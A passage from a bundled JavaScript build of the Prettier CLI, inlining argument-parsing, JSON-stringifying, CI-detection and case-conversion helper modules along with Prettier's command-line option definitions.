import { createRequire as __prettierCreateRequire } from "module";
import { fileURLToPath as __prettierFileUrlToPath } from "url";
import { dirname as __prettierDirname } from "path";
const require = __prettierCreateRequire(import.meta.url);
const __filename = __prettierFileUrlToPath(import.meta.url);
const __dirname = __prettierDirname(__filename);

var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __require = /* @__PURE__ */ ((x) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(x, {
  get: (a, b) => (typeof require !== "undefined" ? require : a)[b]
}) : x)(function(x) {
  if (typeof require !== "undefined") return require.apply(this, arguments);
  throw Error('Dynamic require of "' + x + '" is not supported');
});
var __commonJS = (cb, mod) => function __require2() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// node_modules/dashify/index.js
var require_dashify = __commonJS({
  "node_modules/dashify/index.js"(exports, module) {
    "use strict";
    module.exports = (str, options) => {
      if (typeof str !== "string") throw new TypeError("expected a string");
      return str.trim().replace(/([a-z])([A-Z])/g, "$1-$2").replace(/\W/g, (m) => /[À-ž]/.test(m) ? m : "-").replace(/^-+|-+$/g, "").replace(/-{2,}/g, (m) => options && options.condense ? "-" : m).toLowerCase();
    };
  }
});

// node_modules/minimist/index.js
var require_minimist = __commonJS({
  "node_modules/minimist/index.js"(exports, module) {
    "use strict";
    function hasKey(obj, keys2) {
      var o2 = obj;
      keys2.slice(0, -1).forEach(function(key2) {
        o2 = o2[key2] || {};
      });
      var key = keys2[keys2.length - 1];
      return key in o2;
    }
    function isNumber(x) {
      if (typeof x === "number") {
        return true;
      }
      if (/^0x[0-9a-f]+$/i.test(x)) {
        return true;
      }
      return /^[-+]?(?:\d+(?:\.\d*)?|\.\d+)(e[-+]?\d+)?$/.test(x);
    }
    function isConstructorOrProto(obj, key) {
      return key === "constructor" && typeof obj[key] === "function" || key === "__proto__";
    }
    module.exports = function(args, opts) {
      if (!opts) {
        opts = {};
      }
      var flags = {
        bools: {},
        strings: {},
        unknownFn: null
      };
      if (typeof opts.unknown === "function") {
        flags.unknownFn = opts.unknown;
      }
      if (typeof opts.boolean === "boolean" && opts.boolean) {
        flags.allBools = true;
      } else {
        [].concat(opts.boolean).filter(Boolean).forEach(function(key2) {
          flags.bools[key2] = true;
        });
      }
      var aliases = {};
      function aliasIsBoolean(key2) {
        return aliases[key2].some(function(x) {
          return flags.bools[x];
        });
      }
      Object.keys(opts.alias || {}).forEach(function(key2) {
        aliases[key2] = [].concat(opts.alias[key2]);
        aliases[key2].forEach(function(x) {
          aliases[x] = [key2].concat(aliases[key2].filter(function(y) {
            return x !== y;
          }));
        });
      });
      [].concat(opts.string).filter(Boolean).forEach(function(key2) {
        flags.strings[key2] = true;
        if (aliases[key2]) {
          [].concat(aliases[key2]).forEach(function(k) {
            flags.strings[k] = true;
          });
        }
      });
      var defaults = opts.default || {};
      var argv2 = { _: [] };
      function argDefined(key2, arg2) {
        return flags.allBools && /^--[^=]+$/.test(arg2) || flags.strings[key2] || flags.bools[key2] || aliases[key2];
      }
      function setKey(obj, keys2, value2) {
        var o2 = obj;
        for (var i2 = 0; i2 < keys2.length - 1; i2++) {
          var key2 = keys2[i2];
          if (isConstructorOrProto(o2, key2)) {
            return;
          }
          if (o2[key2] === void 0) {
            o2[key2] = {};
          }
          if (o2[key2] === Object.prototype || o2[key2] === Number.prototype || o2[key2] === String.prototype) {
            o2[key2] = {};
          }
          if (o2[key2] === Array.prototype) {
            o2[key2] = [];
          }
          o2 = o2[key2];
        }
        var lastKey = keys2[keys2.length - 1];
        if (isConstructorOrProto(o2, lastKey)) {
          return;
        }
        if (o2 === Object.prototype || o2 === Number.prototype || o2 === String.prototype) {
          o2 = {};
        }
        if (o2 === Array.prototype) {
          o2 = [];
        }
        if (o2[lastKey] === void 0 || flags.bools[lastKey] || typeof o2[lastKey] === "boolean") {
          o2[lastKey] = value2;
        } else if (Array.isArray(o2[lastKey])) {
          o2[lastKey].push(value2);
        } else {
          o2[lastKey] = [o2[lastKey], value2];
        }
      }
      function setArg(key2, val, arg2) {
        if (arg2 && flags.unknownFn && !argDefined(key2, arg2)) {
          if (flags.unknownFn(arg2) === false) {
            return;
          }
        }
        var value2 = !flags.strings[key2] && isNumber(val) ? Number(val) : val;
        setKey(argv2, key2.split("."), value2);
        (aliases[key2] || []).forEach(function(x) {
          setKey(argv2, x.split("."), value2);
        });
      }
      Object.keys(flags.bools).forEach(function(key2) {
        setArg(key2, defaults[key2] === void 0 ? false : defaults[key2]);
      });
      var notFlags = [];
      if (args.indexOf("--") !== -1) {
        notFlags = args.slice(args.indexOf("--") + 1);
        args = args.slice(0, args.indexOf("--"));
      }
      for (var i = 0; i < args.length; i++) {
        var arg = args[i];
        var key;
        var next;
        if (/^--.+=/.test(arg)) {
          var m = arg.match(/^--([^=]+)=([\s\S]*)$/);
          key = m[1];
          var value = m[2];
          if (flags.bools[key]) {
            value = value !== "false";
          }
          setArg(key, value, arg);
        } else if (/^--no-.+/.test(arg)) {
          key = arg.match(/^--no-(.+)/)[1];
          setArg(key, false, arg);
        } else if (/^--.+/.test(arg)) {
          key = arg.match(/^--(.+)/)[1];
          next = args[i + 1];
          if (next !== void 0 && !/^(-|--)[^-]/.test(next) && !flags.bools[key] && !flags.allBools && (aliases[key] ? !aliasIsBoolean(key) : true)) {
            setArg(key, next, arg);
            i += 1;
          } else if (/^(true|false)$/.test(next)) {
            setArg(key, next === "true", arg);
            i += 1;
          } else {
            setArg(key, flags.strings[key] ? "" : true, arg);
          }
        } else if (/^-[^-]+/.test(arg)) {
          var letters = arg.slice(1, -1).split("");
          var broken = false;
          for (var j = 0; j < letters.length; j++) {
            next = arg.slice(j + 2);
            if (next === "-") {
              setArg(letters[j], next, arg);
              continue;
            }
            if (/[A-Za-z]/.test(letters[j]) && next[0] === "=") {
              setArg(letters[j], next.slice(1), arg);
              broken = true;
              break;
            }
            if (/[A-Za-z]/.test(letters[j]) && /-?\d+(\.\d*)?(e-?\d+)?$/.test(next)) {
              setArg(letters[j], next, arg);
              broken = true;
              break;
            }
            if (letters[j + 1] && letters[j + 1].match(/\W/)) {
              setArg(letters[j], arg.slice(j + 2), arg);
              broken = true;
              break;
            } else {
              setArg(letters[j], flags.strings[letters[j]] ? "" : true, arg);
            }
          }
          key = arg.slice(-1)[0];
          if (!broken && key !== "-") {
            if (args[i + 1] && !/^(-|--)[^-]/.test(args[i + 1]) && !flags.bools[key] && (aliases[key] ? !aliasIsBoolean(key) : true)) {
              setArg(key, args[i + 1], arg);
              i += 1;
            } else if (args[i + 1] && /^(true|false)$/.test(args[i + 1])) {
              setArg(key, args[i + 1] === "true", arg);
              i += 1;
            } else {
              setArg(key, flags.strings[key] ? "" : true, arg);
            }
          }
        } else {
          if (!flags.unknownFn || flags.unknownFn(arg) !== false) {
            argv2._.push(flags.strings._ || !isNumber(arg) ? arg : Number(arg));
          }
          if (opts.stopEarly) {
            argv2._.push.apply(argv2._, args.slice(i + 1));
            break;
          }
        }
      }
      Object.keys(defaults).forEach(function(k) {
        if (!hasKey(argv2, k.split("."))) {
          setKey(argv2, k.split("."), defaults[k]);
          (aliases[k] || []).forEach(function(x) {
            setKey(argv2, x.split("."), defaults[k]);
          });
        }
      });
      if (opts["--"]) {
        argv2["--"] = notFlags.slice();
      } else {
        notFlags.forEach(function(k) {
          argv2._.push(k);
        });
      }
      return argv2;
    };
  }
});

// node_modules/fast-json-stable-stringify/index.js
var require_fast_json_stable_stringify = __commonJS({
  "node_modules/fast-json-stable-stringify/index.js"(exports, module) {
    "use strict";
    module.exports = function(data, opts) {
      if (!opts) opts = {};
      if (typeof opts === "function") opts = { cmp: opts };
      var cycles = typeof opts.cycles === "boolean" ? opts.cycles : false;
      var cmp = opts.cmp && /* @__PURE__ */ (function(f) {
        return function(node) {
          return function(a, b) {
            var aobj = { key: a, value: node[a] };
            var bobj = { key: b, value: node[b] };
            return f(aobj, bobj);
          };
        };
      })(opts.cmp);
      var seen = [];
      return (function stringify5(node) {
        if (node && node.toJSON && typeof node.toJSON === "function") {
          node = node.toJSON();
        }
        if (node === void 0) return;
        if (typeof node == "number") return isFinite(node) ? "" + node : "null";
        if (typeof node !== "object") return JSON.stringify(node);
        var i, out;
        if (Array.isArray(node)) {
          out = "[";
          for (i = 0; i < node.length; i++) {
            if (i) out += ",";
            out += stringify5(node[i]) || "null";
          }
          return out + "]";
        }
        if (node === null) return "null";
        if (seen.indexOf(node) !== -1) {
          if (cycles) return JSON.stringify("__cycle__");
          throw new TypeError("Converting circular structure to JSON");
        }
        var seenIndex = seen.push(node) - 1;
        var keys2 = Object.keys(node).sort(cmp && cmp(node));
        out = "";
        for (i = 0; i < keys2.length; i++) {
          var key = keys2[i];
          var value = stringify5(node[key]);
          if (!value) continue;
          if (out) out += ",";
          out += JSON.stringify(key) + ":" + value;
        }
        seen.splice(seenIndex, 1);
        return "{" + out + "}";
      })(data);
    };
  }
});

// node_modules/common-path-prefix/index.js
var require_common_path_prefix = __commonJS({
  "node_modules/common-path-prefix/index.js"(exports, module) {
    "use strict";
    var { sep: DEFAULT_SEPARATOR } = __require("path");
    var determineSeparator = (paths) => {
      for (const path13 of paths) {
        const match = /(\/|\\)/.exec(path13);
        if (match !== null) return match[0];
      }
      return DEFAULT_SEPARATOR;
    };
    module.exports = function commonPathPrefix2(paths, sep = determineSeparator(paths)) {
      const [first = "", ...remaining] = paths;
      if (first === "" || remaining.length === 0) return "";
      const parts = first.split(sep);
      let endOfPrefix = parts.length;
      for (const path13 of remaining) {
        const compare = path13.split(sep);
        for (let i = 0; i < endOfPrefix; i++) {
          if (compare[i] !== parts[i]) {
            endOfPrefix = i;
          }
        }
        if (endOfPrefix === 0) return "";
      }
      const prefix = parts.slice(0, endOfPrefix).join(sep);
      return prefix.endsWith(sep) ? prefix : prefix + sep;
    };
  }
});

// node_modules/ci-info/vendors.json
var require_vendors = __commonJS({
  "node_modules/ci-info/vendors.json"(exports, module) {
    module.exports = [
      {
        name: "Agola CI",
        constant: "AGOLA",
        env: "AGOLA_GIT_REF",
        pr: "AGOLA_PULL_REQUEST_ID"
      },
      {
        name: "Appcircle",
        constant: "APPCIRCLE",
        env: "AC_APPCIRCLE",
        pr: {
          env: "AC_GIT_PR",
          ne: "false"
        }
      },
      {
        name: "AppVeyor",
        constant: "APPVEYOR",
        env: "APPVEYOR",
        pr: "APPVEYOR_PULL_REQUEST_NUMBER"
      },
      {
        name: "AWS CodeBuild",
        constant: "CODEBUILD",
        env: "CODEBUILD_BUILD_ARN",
        pr: {
          env: "CODEBUILD_WEBHOOK_EVENT",
          any: [
            "PULL_REQUEST_CREATED",
            "PULL_REQUEST_UPDATED",
            "PULL_REQUEST_REOPENED"
          ]
        }
      },
      {
        name: "Azure Pipelines",
        constant: "AZURE_PIPELINES",
        env: "TF_BUILD",
        pr: {
          BUILD_REASON: "PullRequest"
        }
      },
      {
        name: "Bamboo",
        constant: "BAMBOO",
        env: "bamboo_planKey"
      },
      {
        name: "Bitbucket Pipelines",
        constant: "BITBUCKET",
        env: "BITBUCKET_COMMIT",
        pr: "BITBUCKET_PR_ID"
      },
      {
        name: "Bitrise",
        constant: "BITRISE",
        env: "BITRISE_IO",
        pr: "BITRISE_PULL_REQUEST"
      },
      {
        name: "Buddy",
        constant: "BUDDY",
        env: "BUDDY_WORKSPACE_ID",
        pr: "BUDDY_EXECUTION_PULL_REQUEST_ID"
      },
      {
        name: "Buildkite",
        constant: "BUILDKITE",
        env: "BUILDKITE",
        pr: {
          env: "BUILDKITE_PULL_REQUEST",
          ne: "false"
        }
      },
      {
        name: "CircleCI",
        constant: "CIRCLE",
        env: "CIRCLECI",
        pr: "CIRCLE_PULL_REQUEST"
      },
      {
        name: "Cirrus CI",
        constant: "CIRRUS",
        env: "CIRRUS_CI",
        pr: "CIRRUS_PR"
      },
      {
        name: "Cloudflare Pages",
        constant: "CLOUDFLARE_PAGES",
        env: "CF_PAGES"
      },
      {
        name: "Cloudflare Workers",
        constant: "CLOUDFLARE_WORKERS",
        env: "WORKERS_CI"
      },
      {
        name: "Codefresh",
        constant: "CODEFRESH",
        env: "CF_BUILD_ID",
        pr: {
          any: [
            "CF_PULL_REQUEST_NUMBER",
            "CF_PULL_REQUEST_ID"
          ]
        }
      },
      {
        name: "Codemagic",
        constant: "CODEMAGIC",
        env: "CM_BUILD_ID",
        pr: "CM_PULL_REQUEST"
      },
      {
        name: "Codeship",
        constant: "CODESHIP",
        env: {
          CI_NAME: "codeship"
        }
      },
      {
        name: "Drone",
        constant: "DRONE",
        env: "DRONE",
        pr: {
          DRONE_BUILD_EVENT: "pull_request"
        }
      },
      {
        name: "dsari",
        constant: "DSARI",
        env: "DSARI"
      },
      {
        name: "Earthly",
        constant: "EARTHLY",
        env: "EARTHLY_CI"
      },
      {
        name: "Expo Application Services",
        constant: "EAS",
        env: "EAS_BUILD"
      },
      {
        name: "Gerrit",
        constant: "GERRIT",
        env: "GERRIT_PROJECT"
      },
      {
        name: "Gitea Actions",
        constant: "GITEA_ACTIONS",
        env: "GITEA_ACTIONS"
      },
      {
        name: "GitHub Actions",
        constant: "GITHUB_ACTIONS",
        env: "GITHUB_ACTIONS",
        pr: {
          GITHUB_EVENT_NAME: "pull_request"
        }
      },
      {
        name: "GitLab CI",
        constant: "GITLAB",
        env: "GITLAB_CI",
        pr: "CI_MERGE_REQUEST_ID"
      },
      {
        name: "GoCD",
        constant: "GOCD",
        env: "GO_PIPELINE_LABEL"
      },
      {
        name: "Google Cloud Build",
        constant: "GOOGLE_CLOUD_BUILD",
        env: "BUILDER_OUTPUT"
      },
      {
        name: "Harness CI",
        constant: "HARNESS",
        env: "HARNESS_BUILD_ID"
      },
      {
        name: "Heroku",
        constant: "HEROKU",
        env: {
          env: "NODE",
          includes: "/app/.heroku/node/bin/node"
        }
      },
      {
        name: "Hudson",
        constant: "HUDSON",
        env: "HUDSON_URL"
      },
      {
        name: "Jenkins",
        constant: "JENKINS",
        env: [
          "JENKINS_URL",
          "BUILD_ID"
        ],
        pr: {
          any: [
            "ghprbPullId",
            "CHANGE_ID"
          ]
        }
      },
      {
        name: "LayerCI",
        constant: "LAYERCI",
        env: "LAYERCI",
        pr: "LAYERCI_PULL_REQUEST"
      },
      {
        name: "Magnum CI",
        constant: "MAGNUM",
        env: "MAGNUM"
      },
      {
        name: "Netlify CI",
        constant: "NETLIFY",
        env: "NETLIFY",
        pr: {
          env: "PULL_REQUEST",
          ne: "false"
        }
      },
      {
        name: "Nevercode",
        constant: "NEVERCODE",
        env: "NEVERCODE",
        pr: {
          env: "NEVERCODE_PULL_REQUEST",
          ne: "false"
        }
      },
      {
        name: "Prow",
        constant: "PROW",
        env: "PROW_JOB_ID"
      },
      {
        name: "ReleaseHub",
        constant: "RELEASEHUB",
        env: "RELEASE_BUILD_ID"
      },
      {
        name: "Render",
        constant: "RENDER",
        env: "RENDER",
        pr: {
          IS_PULL_REQUEST: "true"
        }
      },
      {
        name: "Sail CI",
        constant: "SAIL",
        env: "SAILCI",
        pr: "SAIL_PULL_REQUEST_NUMBER"
      },
      {
        name: "Screwdriver",
        constant: "SCREWDRIVER",
        env: "SCREWDRIVER",
        pr: {
          env: "SD_PULL_REQUEST",
          ne: "false"
        }
      },
      {
        name: "Semaphore",
        constant: "SEMAPHORE",
        env: "SEMAPHORE",
        pr: "PULL_REQUEST_NUMBER"
      },
      {
        name: "Sourcehut",
        constant: "SOURCEHUT",
        env: {
          CI_NAME: "sourcehut"
        }
      },
      {
        name: "Strider CD",
        constant: "STRIDER",
        env: "STRIDER"
      },
      {
        name: "TaskCluster",
        constant: "TASKCLUSTER",
        env: [
          "TASK_ID",
          "RUN_ID"
        ]
      },
      {
        name: "TeamCity",
        constant: "TEAMCITY",
        env: "TEAMCITY_VERSION"
      },
      {
        name: "Travis CI",
        constant: "TRAVIS",
        env: "TRAVIS",
        pr: {
          env: "TRAVIS_PULL_REQUEST",
          ne: "false"
        }
      },
      {
        name: "Vela",
        constant: "VELA",
        env: "VELA",
        pr: {
          VELA_PULL_REQUEST: "1"
        }
      },
      {
        name: "Vercel",
        constant: "VERCEL",
        env: {
          any: [
            "NOW_BUILDER",
            "VERCEL"
          ]
        },
        pr: "VERCEL_GIT_PULL_REQUEST_ID"
      },
      {
        name: "Visual Studio App Center",
        constant: "APPCENTER",
        env: "APPCENTER_BUILD_ID"
      },
      {
        name: "Woodpecker",
        constant: "WOODPECKER",
        env: {
          CI: "woodpecker"
        },
        pr: {
          CI_BUILD_EVENT: "pull_request"
        }
      },
      {
        name: "Xcode Cloud",
        constant: "XCODE_CLOUD",
        env: "CI_XCODE_PROJECT",
        pr: "CI_PULL_REQUEST_NUMBER"
      },
      {
        name: "Xcode Server",
        constant: "XCODE_SERVER",
        env: "XCS"
      }
    ];
  }
});

// node_modules/ci-info/index.js
var require_ci_info = __commonJS({
  "node_modules/ci-info/index.js"(exports) {
    "use strict";
    var vendors = require_vendors();
    var env3 = process.env;
    Object.defineProperty(exports, "_vendors", {
      value: vendors.map(function(v) {
        return v.constant;
      })
    });
    exports.name = null;
    exports.isPR = null;
    exports.id = null;
    vendors.forEach(function(vendor) {
      const envs = Array.isArray(vendor.env) ? vendor.env : [vendor.env];
      const isCI2 = envs.every(function(obj) {
        return checkEnv(obj);
      });
      exports[vendor.constant] = isCI2;
      if (!isCI2) {
        return;
      }
      exports.name = vendor.name;
      exports.isPR = checkPR(vendor);
      exports.id = vendor.constant;
    });
    exports.isCI = !!(env3.CI !== "false" && // Bypass all checks if CI env is explicitly set to 'false'
    (env3.BUILD_ID || // Jenkins, Cloudbees
    env3.BUILD_NUMBER || // Jenkins, TeamCity
    env3.CI || // Travis CI, CircleCI, Cirrus CI, Gitlab CI, Appveyor, CodeShip, dsari, Cloudflare Pages/Workers
    env3.CI_APP_ID || // Appflow
    env3.CI_BUILD_ID || // Appflow
    env3.CI_BUILD_NUMBER || // Appflow
    env3.CI_NAME || // Codeship and others
    env3.CONTINUOUS_INTEGRATION || // Travis CI, Cirrus CI
    env3.RUN_ID || // TaskCluster, dsari
    exports.name || false));
    function checkEnv(obj) {
      if (typeof obj === "string") return !!env3[obj];
      if ("env" in obj) {
        return env3[obj.env] && env3[obj.env].includes(obj.includes);
      }
      if ("any" in obj) {
        return obj.any.some(function(k) {
          return !!env3[k];
        });
      }
      return Object.keys(obj).every(function(k) {
        return env3[k] === obj[k];
      });
    }
    function checkPR(vendor) {
      switch (typeof vendor.pr) {
        case "string":
          return !!env3[vendor.pr];
        case "object":
          if ("env" in vendor.pr) {
            if ("any" in vendor.pr) {
              return vendor.pr.any.some(function(key) {
                return env3[vendor.pr.env] === key;
              });
            } else {
              return vendor.pr.env in env3 && env3[vendor.pr.env] !== vendor.pr.ne;
            }
          } else if ("any" in vendor.pr) {
            return vendor.pr.any.some(function(key) {
              return !!env3[key];
            });
          } else {
            return checkEnv(vendor.pr);
          }
        default:
          return null;
      }
    }
  }
});

// src/cli/index.js
import * as prettier2 from "../index.mjs";

// scripts/build/shims/at.js
var at = (isOptionalObject, object2, index) => {
  if (isOptionalObject && (object2 === void 0 || object2 === null)) {
    return;
  }
  if (Array.isArray(object2) || typeof object2 === "string") {
    return object2[index < 0 ? object2.length + index : index];
  }
  return object2.at(index);
};
var at_default = at;

// src/cli/options/get-context-options.js
var import_dashify = __toESM(require_dashify(), 1);
import { getSupportInfo } from "../index.mjs";

// src/cli/cli-options.evaluate.js
var cli_options_evaluate_default = {
  "cache": {
    "default": false,
    "description": "Only format changed files. Cannot use with --stdin-filepath.",
    "type": "boolean"
  },
  "cacheLocation": {
    "description": "Path to the cache file.",
    "type": "path"
  },
  "cacheStrategy": {
    "choices": [
      {
        "description": "Use the file metadata such as timestamps as cache keys",
        "value": "metadata"
      },
      {
        "description": "Use the file content as cache keys",
        "value": "content"
      }
    ],
    "description": "Strategy for the cache to use for detecting changed files.",
    "type": "choice"
  },
  "check": {
    "alias": "c",
    "category": "Output",
    "description": "Check if the given files are formatted, print a human-friendly summary\nmessage and paths to unformatted files (see also --list-different).",
    "type": "boolean"
  },
  "color": {
    "default": true,
    "description": "Colorize error messages.",
    "oppositeDescription": "Do not colorize error messages.",
    "type": "boolean"
  },
  "config": {
    "category": "Config",
    "description": "Path to a Prettier configuration file (.prettierrc, package.json, prettier.config.js).",
    "exception": (value) => value === false,
    "oppositeDescription": "Do not look for a configuration file.",
    "type": "path"
  },
  "configPrecedence": {
    "category": "Config",
    "choices": [
      {
        "description": "CLI options take precedence over config file",
        "value": "cli-override"
      },
      {
        "description": "Config file take precedence over CLI options",
        "value": "file-override"
      },
      {
        "description": "If a config file is found will evaluate it and ignore other CLI options.\nIf no config file is found CLI options will evaluate as normal.",
        "value": "prefer-file"
      }
    ],
    "default": "cli-override",
    "description": "Define in which order config files and CLI options should be evaluated.",
    "type": "choice"
  },
  "debugBenchmark": {
    "type": "boolean"
  },
  "debugCheck": {
    "type": "boolean"
  },
  "debugPrintAst": {
    "type": "boolean"
  },
  "debugPrintComments": {
    "type": "boolean"
  },
  "debugPrintDoc": {
    "type": "boolean"
  },
  "debugRepeat": {
    "default": 0,
    "type": "int"
  },
  "editorconfig": {
    "category": "Config",
    "default": true,
    "description": "Take .editorconfig into account when parsing configuration.",
    "oppositeDescription": "Don't take .editorconfig into account when parsing configuration.",
    "type": "boolean"
  },
  "errorOnUnmatchedPattern": {
    "oppositeDescription": "Prevent errors when pattern is unmatched.",
    "type": "boolean"
  },
  "fileInfo": {
    "description": "Extract the following info (as JSON) for a given file path. Reported fields:\n* ignored (boolean) - true if file path is filtered by --ignore-path\n* inferredParser (string | null) - name of parser inferred from file path",
    "type": "path"
  },
  "findConfigPath": {
    "category": "Config",
    "description": "Find and print the path to a configuration file for the given input file.",
    "type": "path"
  },
  "help": {
    "alias": "h",
    "description": "Show CLI usage, or details about the given flag.\nExample: --help write",
    "exception": (value) => value === "",
    "type": "flag"
  },
  "ignorePath": {
    "array": true,
    "category": "Config",
    "default": [
      {
        "value": [
          ".gitignore",
          ".prettierignore"
        ]
      }
    ],
    "description": "Path to a file with patterns describing files to ignore.\nMultiple values are accepted.",
    "type": "path"
  },
  "ignoreUnknown": {
    "alias": "u",
    "description": "Ignore unknown files.",
    "type": "boolean"
  },
  "listDifferent": {
    "alias": "l",
    "category": "Output",
    "description": "Print the names of files that are different from Prettier's formatting (see also --check).",
    "type": "boolean"
  },
  "logLevel": {
    "choices": [
      "silent",
      "error",
      "warn",
      "log",
      "debug"
    ],
    "default": "log",
    "description": "What level of logs to report.",
    "type": "choice"
  },
  "supportInfo": {
    "description": "Print support information as JSON.",
    "type": "boolean"
  },
  "version": {
    "alias": "v",
    "description": "Print Prettier version.",
    "type": "boolean"
  },
  "withNodeModules": {
    "category": "Config",
    "description": "Process files inside 'node_modules' directory.",
    "type": "boolean"
  },
  "write": {
    "alias": "w",
    "category": "Output",
    "description": "Edit files in-place. (Beware!)",
    "type": "boolean"
  }
};

// src/cli/prettier-internal.js
import { __internal as sharedWithCli } from "../index.mjs";
var {
  errors,
  optionCategories,
  createIsIgnoredFunction,
  formatOptionsHiddenDefaults,
  normalizeOptions,
  getSupportInfoWithoutPlugins,
  normalizeOptionSettings,
  vnopts,
  fastGlob,
  createTwoFilesPatch,
  picocolors,
  leven
} = sharedWithCli;

// src/cli/options/get-context-options.js
var detailedCliOptions = normalizeOptionSettings(cli_options_evaluate_default).map(
  (option) => normalizeDetailedOption(option)
);
function apiOptionToCliOption(apiOption) {
  const cliOption = {
    ...apiOption,
    description: apiOption.cliDescription ?? apiOption.description,
    category: apiOption.cliCategory ?? optionCategories.CATEGORY_FORMAT,
    forwardToApi: apiOption.name
  };
  if (apiOption.deprecated) {
    delete cliOption.forwardToApi;
    delete cliOption.description;
    delete cliOption.oppositeDescription;
    cliOption.deprecated = true;
  }
  return normalizeDetailedOption(cliOption);
}
function normalizeDetailedOption(option) {
  return {
    category: optionCategories.CATEGORY_OTHER,
    ...option,
    name: option.cliName ?? (0, import_dashify.default)(option.name),
    choices: option.choices?.map((choice) => {
      const newChoice = {
        description: "",
        deprecated: false,
        ...typeof choice === "object" ? choice : { value: choice }
      };
      if (newChoice.value === true) {
        newChoice.value = "";
      }
      return newChoice;
    })
  };
}
function supportInfoToContextOptions({ options: supportOptions, languages }) {
  const detailedOptions = [
    ...detailedCliOptions,
    ...supportOptions.map((apiOption) => apiOptionToCliOption(apiOption))
  ];
  return {
    supportOptions,
    languages,
    detailedOptions
  };
}
async function getContextOptions(plugins) {
  const supportInfo = await getSupportInfo({
    showDeprecated: true,
    plugins
  });
  return supportInfoToContextOptions(supportInfo);
}
function getContextOptionsWithoutPlugins() {
  const supportInfo = getSupportInfoWithoutPlugins();
  return supportInfoToContextOptions(supportInfo);
}

// scripts/build/shims/string-replace-all.js
var stringReplaceAll = (isOptionalObject, original, pattern, replacement) => {
  if (isOptionalObject && (original === void 0 || original === null)) {
    return;
  }
  if (original.replaceAll) {
    return original.replaceAll(pattern, replacement);
  }
  if (pattern.global) {
    return original.replace(pattern, replacement);
  }
  return original.split(pattern).join(replacement);
};
var string_replace_all_default = stringReplaceAll;

// node_modules/camelcase/index.js
var UPPERCASE = /[\p{Lu}]/u;
var LOWERCASE = /[\p{Ll}]/u;
var LEADING_CAPITAL = /^[\p{Lu}](?![\p{Lu}])/gu;
var IDENTIFIER = /([\p{Alpha}\p{N}_]|$)/u;
var SEPARATORS = /[_.\- ]+/;
var LEADING_SEPARATORS = new RegExp("^" + SEPARATORS.source);
var SEPARATORS_AND_IDENTIFIER = new RegExp(SEPARATORS.source + IDENTIFIER.source, "gu");
var NUMBERS_AND_IDENTIFIER = new RegExp("\\d+" + IDENTIFIER.source, "gu");
var preserveCamelCase = (string, toLowerCase, toUpperCase, preserveConsecutiveUppercase2) => {
  let isLastCharLower = false;
  let isLastCharUpper = false;
  let isLastLastCharUpper = false;
  let isLastLastCharPreserved = false;
  for (let index = 0; index < string.length; index++) {
    const character = string[index];
    isLastLastCharPreserved = index > 2 ? string[index - 3] === "-" : true;
    if (isLastCharLower && UPPERCASE.test(character)) {
      string = string.slice(0, index) + "-" + string.slice(index);
      isLastCharLower = false;
      isLastLastCharUpper = isLastCharUpper;
      isLastCharUpper = true;
      index++;
    } else if (isLastCharUpper && isLastLastCharUpper && LOWERCASE.test(character) && (!isLastLastCharPreserved || preserveConsecutiveUppercase2)) {
      string = string.slice(0, index - 1) + "-" + string.slice(index - 1);
      isLastLastCharUpper = isLastCharUpper;
      isLastCharUpper = false;
      isLastCharLower = true;
    } else {
      isLastCharLower = toLowerCase(character) === character && toUpperCase(character) !== character;
      isLastLastCharUpper = isLastCharUpper;
      isLastCharUpper = toUpperCase(character) === character && toLowerCase(character) !== character;
    }
  }
  return string;
};
var preserveConsecutiveUppercase = (input, toLowerCase) => {
  LEADING_CAPITAL.lastIndex = 0;
  return string_replace_all_default(
    /* isOptionalObject */
    false,
    input,
    LEADING_CAPITAL,
    (match) => toLowerCase(match)
  );
};
var postProcess = (input, toUpperCase) => {
  SEPARATORS_AND_IDENTIFIER.lastIndex = 0;
  NUMBERS_AND_IDENTIFIER.lastIndex = 0;
  return string_replace_all_default(
    /* isOptionalObject */
    false,
    string_replace_all_default(
      /* isOptionalObject */
      false,
      input,
      NUMBERS_AND_IDENTIFIER,
      (match, pattern, offset) => ["_", "-"].includes(input.charAt(offset + match.length)) ? match : toUpperCase(match)
    ),
    SEPARATORS_AND_IDENTIFIER,
    (_2, identifier) => toUpperCase(identifier)
  );
};
function camelCase(input, options) {
  if (!(typeof input === "string" || Array.isArray(input))) {
    throw new TypeError("Expected the input to be `string | string[]`");
  }
  options = {
    pascalCase: false,
    preserveConsecutiveUppercase: false,
    ...options
  };
  if (Array.isArray(input)) {
    input = input.map((x) => x.trim()).filter((x) => x.length).join("-");
  } else {
    input = input.trim();
  }
  if (input.length === 0) {
    return "";
  }
  const toLowerCase = options.locale === false ? (string) => string.toLowerCase() : (string) => string.toLocaleLowerCase(options.locale);
  const toUpperCase = options.locale === false ? (string) => string.toUpperCase() : (string) => string.toLocaleUpperCase(options.locale);
  if (input.length === 1) {
    if (SEPARATORS.test(input)) {
      return "";
    }
    return options.pascalCase ? toUpperCase(input) : toLowerCase(input);
  }
  const hasUpperCase = input !== toLowerCase(input);
  if (hasUpperCase) {
    input = preserveCamelCase(input, toLowerCase, toUpperCase, options.preserveConsecutiveUppercase);
  }
  input = input.replace(LEADING_SEPARATORS, "");
  input = options.preserveConsecutiveUppercase ? preserveConsecutiveUppercase(input, toLowerCase) : toLowerCase(input);
  if (options.pascalCase) {
    input = toUpperCase(input.charAt(0)) + input.slice(1);
  }
  return postProcess(input, toUpperCase);
}

// src/cli/utils.js
import fs from "fs/promises";
import path from "path";

